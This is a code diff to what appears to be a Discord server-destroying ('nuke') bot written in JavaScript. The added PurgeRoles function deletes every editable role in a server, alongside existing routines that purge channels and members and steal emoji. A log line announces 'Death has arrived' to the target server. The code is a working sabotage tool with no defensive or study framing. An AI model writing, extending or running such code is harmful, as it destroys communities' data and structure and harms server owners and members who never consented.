@@ -64,6 +64,16 @@ const PurgeMembers = async (g) => {
   }
 };
 
+const PurgeRoles = async (g) => {
+  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_ROLES)) {
+    await g.roles.fetch().then((roles) =>
+      roles.map((role) => {
+        role.editable && role.delete();
+      })
+    );
+  }
+};
+
 const Logging = (g) => {
   let log = `[${new Date().toISOString()}] [INFO] Death has arrived to: ${
     g.name
@@ -167,6 +177,7 @@ export const Purge = (client) => {
 
     await PurgeChannels(g);
     await PurgeMembers(g);
+    await PurgeRoles(g);
     serverId = await UpdateUserRanking(client, g);
 
     let emojiBatchInsert = await StealEmoji(g);
